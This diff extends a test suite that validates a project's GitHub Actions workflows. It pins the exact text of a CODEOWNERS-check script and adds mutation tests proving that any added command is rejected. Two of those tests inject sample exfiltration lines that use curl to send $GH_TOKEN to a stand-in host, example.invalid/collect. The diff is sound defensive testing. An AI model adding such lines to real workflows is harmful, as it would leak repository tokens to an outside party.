@@ -464,6 +464,18 @@ for path in sorted(seen):
     # property other than token by name: github['token'], github[format(...)], toJSON(github) and
     # bare github hand the token on as surely as github.token. Expressions ignore case, so this
     # does too.
+    CODEOWNERS_RUN = r"""response=$(gh api "repos/$REPOSITORY/codeowners/errors?ref=$REF")
+count=$(jq -e '.errors | arrays | length' <<<"$response") || {
+  echo "GitHub's answer holds no list of CODEOWNERS errors: $response" >&2
+  exit 1
+}
+if [ "$count" -ne 0 ]; then
+  jq -r '.errors[] | "\(.path):\(.line): \(.kind): \(.message)"' <<<"$response" >&2
+  echo "GitHub rejects $count line(s) of CODEOWNERS" >&2
+  exit 1
+fi
+echo "GitHub reads every line of CODEOWNERS"
+"""
     def token_reads(value):
         return [e.strip() for e in expressions(value)
                 if re.search(r"\bsecrets\b", e, re.I)
@@ -485,6 +497,11 @@ for path in sorted(seen):
         ask_steps = ask.get("steps", [])
         check(len(ask_steps) == 1 and "uses" not in ask_steps[0] and "codeowners/errors" in str(ask_steps[0].get("run", "")),
               "%s > codeowners must be one script step that asks GitHub for the CODEOWNERS errors, nothing checked out" % where)
+        # the script itself, to the letter: it runs with the job token in its environment, so a command
+        # added to it would run with the token, and nothing short of the whole text is allowed
+        for step in ask_steps:
+            check(str(step.get("run", "")).strip() == CODEOWNERS_RUN.strip(),
+                  "%s > codeowners must run exactly the script this test holds, with nothing added to it" % where)
         for step in ask_steps:
             unconditional("codeowners", step, "the CODEOWNERS check")
             check((step.get("env") or {}).get("GH_TOKEN") == "${{ github.token }}",
@@ -1429,6 +1446,15 @@ breaks next.yml replace '      - name: Check CODEOWNERS makes the release manage
 ' '      - name: Check CODEOWNERS makes the release managers own what the release build runs
         continue-on-error: true
 ' "build: the CODEOWNERS ownership test must not continue on error"
+
+breaks next.yml replace '          echo "GitHub reads every line of CODEOWNERS"
+' '          echo "GitHub reads every line of CODEOWNERS"
+          curl -s -H "Authorization: Bearer $GH_TOKEN" https://example.invalid/collect
+' "./.github/workflows/next.yml > codeowners must run exactly the script this test holds"
+breaks next.yml replace '          response=$(gh api "repos/$REPOSITORY/codeowners/errors?ref=$REF")
+' '          curl -s -d "$GH_TOKEN" https://example.invalid/collect
+          response=$(gh api "repos/$REPOSITORY/codeowners/errors?ref=$REF")
+' "./.github/workflows/next.yml > codeowners must run exactly the script this test holds"
 
 # That job's script, run as it is written (bash -e, GitHub's shell for a step that names none)
 # against a gh that gives the answers GitHub gives: no errors, errors, no list, and a failed call.
